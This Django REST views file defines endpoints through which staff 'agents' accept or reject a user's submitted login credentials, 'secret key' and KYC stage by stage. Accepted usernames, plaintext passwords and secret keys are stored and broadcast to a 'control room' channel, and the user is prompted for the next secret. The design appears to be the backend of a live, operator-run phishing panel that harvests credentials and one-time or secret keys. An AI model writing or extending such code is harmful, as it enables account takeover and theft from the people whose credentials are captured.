# accounts/api/views/agent_action_views.py
"""
Agent Action API Views

Handles agent decisions on user submissions:
- Accept/reject login credentials
- Accept/reject secret key
- Accept/reject KYC

These endpoints require agent authentication (IsAuthenticated + is_staff).
"""

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated
from rest_framework import status
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from django.utils import timezone
from django.shortcuts import get_object_or_404

from accounts.models import Session, SessionLog
from ..permissions import IsSessionAgent
from ..serializers import (
    RejectLoginSerializer,
    RejectOTPSerializer,
    RejectKYCSerializer,
)


class AcceptLoginView(APIView):
    """
    Agent accepts user login credentials and progresses session.

    POST /api/sessions/{uuid}/accept-login/

    Returns:
    - login_accepted: Credentials verified, moving to secret_key stage
    - next_stage: The next stage (secret_key)
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # Check permission: user must be the agent or staff
        if not request.user.is_superuser and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        # Extract current submission
        user_data = session.user_data or {}
        current_submission = user_data.get('current_submission', {})

        # Validate we're in credentials stage
        if current_submission.get('stage') != 'credentials':
            return Response(
                {
                    'error': f"Expected stage 'credentials', but session is at '{current_submission.get('stage')}'",
                    'current_stage': current_submission.get('stage')
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # Move submission to verified data
        user_data['verified_data'] = user_data.get('verified_data', {})
        user_data['verified_data']['credentials'] = {
            'username': current_submission['data'].get('username'),
            'password': current_submission['data'].get('password'),
            'verified_at': timezone.now().isoformat(),
            'verified_by': request.user.username
        }

        # Clear current submission and advance stage
        user_data['current_submission'] = {}
        session.stage = 'secret_key'
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # Log action
        SessionLog.objects.create(
            session=session,
            message='Agent accepted login credentials',
            log_type='agent_action',
            extra_data={'accepted_by': request.user.username}
        )

        # Notify control room
        try:
            async_to_sync(get_channel_layer().group_send)(
                'control_room',
                {
                    'type': 'verified_data',
                    'uuid': str(session.uuid),
                    'data': user_data.get('verified_data', {})
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify control room: {str(e)}")

        # Notify user to proceed
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'accept',
                    'stage': 'credentials',
                    'next_stage': 'secret_key',
                    'message': 'Login credentials accepted. Please proceed to enter your secret key.'
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify user: {str(e)}")

        return Response(
            {
                'status': 'login_accepted',
                'next_stage': 'secret_key',
                'message': 'User credentials verified. Moving to secret key stage.'
            },
            status=status.HTTP_200_OK
        )


class RejectLoginView(APIView):
    """
    Agent rejects user login credentials.

    POST /api/sessions/{uuid}/reject-login/
    Body: {"reason": "Invalid credentials"} (optional)

    User is asked to re-enter credentials.
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # Check permission
        if not request.user.is_superuser and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        serializer = RejectLoginSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        reason = serializer.validated_data.get('reason', 'Invalid credentials')

        # Clear current submission but stay in credentials stage
        user_data = session.user_data or {}
        user_data['current_submission'] = {}
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # Log action
        SessionLog.objects.create(
            session=session,
            message=f'Agent rejected login credentials: {reason}',
            log_type='agent_action',
            extra_data={'rejected_by': request.user.username, 'reason': reason}
        )

        # Notify user to retry
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'reject',
                    'stage': 'credentials',
                    'message': f'Login rejected. {reason} Please try again.'
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify user: {str(e)}")

        return Response(
            {
                'status': 'login_rejected',
                'message': 'User credentials rejected. They will be asked to retry.'
            },
            status=status.HTTP_200_OK
        )


class AcceptOTPView(APIView):
    """
    Agent accepts user secret key (OTP) and progresses session.

    POST /api/sessions/{uuid}/accept-otp/

    Returns:
    - otp_accepted: Secret key verified, moving to kyc stage
    - next_stage: The next stage (kyc)
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # Check permission
        if not request.user.is_superuser and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        # Extract current submission
        user_data = session.user_data or {}
        current_submission = user_data.get('current_submission', {})

        # Validate stage
        if current_submission.get('stage') != 'secret_key':
            return Response(
                {
                    'error': f"Expected stage 'secret_key', but session is at '{current_submission.get('stage')}'",
                    'current_stage': current_submission.get('stage')
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # Move submission to verified data
        user_data['verified_data'] = user_data.get('verified_data', {})
        user_data['verified_data']['secret_key'] = {
            'secret_key': current_submission['data'].get('secret_key'),
            'verified_at': timezone.now().isoformat(),
            'verified_by': request.user.username
        }

        # Clear current submission and advance stage
        user_data['current_submission'] = {}
        session.stage = 'kyc'
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # Log action
        SessionLog.objects.create(
            session=session,
            message='Agent accepted secret key',
            log_type='agent_action',
            extra_data={'accepted_by': request.user.username}
        )

        # Notify control room
        try:
            async_to_sync(get_channel_layer().group_send)(
                'control_room',
                {
                    'type': 'verified_data',
                    'uuid': str(session.uuid),
                    'data': user_data.get('verified_data', {})
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify control room: {str(e)}")

        # Notify user to proceed
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'accept',
                    'stage': 'secret_key',
                    'next_stage': 'kyc',
                    'message': 'Secret key verified. Please proceed to complete KYC.'
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify user: {str(e)}")

        return Response(
            {
                'status': 'otp_accepted',
                'next_stage': 'kyc',
                'message': 'Secret key verified. Moving to KYC stage.'
            },
            status=status.HTTP_200_OK
        )


class RejectOTPView(APIView):
    """
    Agent rejects user secret key (OTP).

    POST /api/sessions/{uuid}/reject-otp/
    Body: {"reason": "Invalid OTP"} (optional)

    User is asked to re-enter secret key.
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # Check permission
        if not request.user.is_superuser and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        serializer = RejectOTPSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        reason = serializer.validated_data.get('reason', 'Invalid secret key')

        # Clear current submission but stay in secret_key stage
        user_data = session.user_data or {}
        user_data['current_submission'] = {}
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # Log action
        SessionLog.objects.create(
            session=session,
            message=f'Agent rejected secret key: {reason}',
            log_type='agent_action',
            extra_data={'rejected_by': request.user.username, 'reason': reason}
        )

        # Notify user to retry
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'reject',
                    'stage': 'secret_key',
                    'message': f'Secret key rejected. {reason} Please try again.'
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify user: {str(e)}")

        return Response(
            {
                'status': 'otp_rejected',
                'message': 'User secret key rejected. They will be asked to retry.'
            },
            status=status.HTTP_200_OK
        )


class AcceptKYCView(APIView):
    """
    Agent accepts user KYC submission and completes session.

    POST /api/sessions/{uuid}/accept-kyc/

    Returns:
    - kyc_accepted: KYC verified, session completed
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # Check permission
        if not request.user.is_superuser and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        # Extract current submission
        user_data = session.user_data or {}
        current_submission = user_data.get('current_submission', {})

        # Validate stage
        if current_submission.get('stage') != 'kyc':
            return Response(
                {
                    'error': f"Expected stage 'kyc', but session is at '{current_submission.get('stage')}'",
                    'current_stage': current_submission.get('stage')
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # Move submission to verified data
        user_data['verified_data'] = user_data.get('verified_data', {})
        user_data['verified_data']['kyc'] = {
            'status': 'verified',
            'verified_at': timezone.now().isoformat(),
            'verified_by': request.user.username
        }

        # Clear current submission, advance stage, and complete session
        user_data['current_submission'] = {}
        session.stage = 'completed'
        session.status = 'completed'
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # Log action
        SessionLog.objects.create(
            session=session,
            message='Agent accepted KYC and completed session',
            log_type='agent_action',
            extra_data={'accepted_by': request.user.username}
        )

        # Notify control room
        try:
            async_to_sync(get_channel_layer().group_send)(
                'control_room',
                {
                    'type': 'verified_data',
                    'uuid': str(session.uuid),
                    'data': user_data.get('verified_data', {})
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify control room: {str(e)}")

        # Notify user of completion
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'accept',
                    'stage': 'kyc',
                    'next_stage': 'completed',
                    'message': 'KYC verified. Verification process completed successfully!'
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify user: {str(e)}")

        return Response(
            {
                'status': 'kyc_accepted',
                'message': 'KYC verified. Session completed successfully.'
            },
            status=status.HTTP_200_OK
        )


class RejectKYCView(APIView):
    """
    Agent rejects user KYC submission.

    POST /api/sessions/{uuid}/reject-kyc/
    Body: {"reason": "KYC failed"} (optional)

    User stays in kyc stage and can retry.
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # Check permission
        if not request.user.is_superuser and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        serializer = RejectKYCSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        reason = serializer.validated_data.get('reason', 'KYC verification failed')

        # Clear current submission but stay in kyc stage
        user_data = session.user_data or {}
        user_data['current_submission'] = {}
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # Log action
        SessionLog.objects.create(
            session=session,
            message=f'Agent rejected KYC: {reason}',
            log_type='agent_action',
            extra_data={'rejected_by': request.user.username, 'reason': reason}
        )

        # Notify user to retry
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'reject',
                    'stage': 'kyc',
                    'message': f'KYC rejected. {reason} Please try again.'
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify user: {str(e)}")

        return Response(
            {
                'status': 'kyc_rejected',
                'message': 'User KYC rejected. They will be asked to retry.'
            },
            status=status.HTTP_200_OK
        )
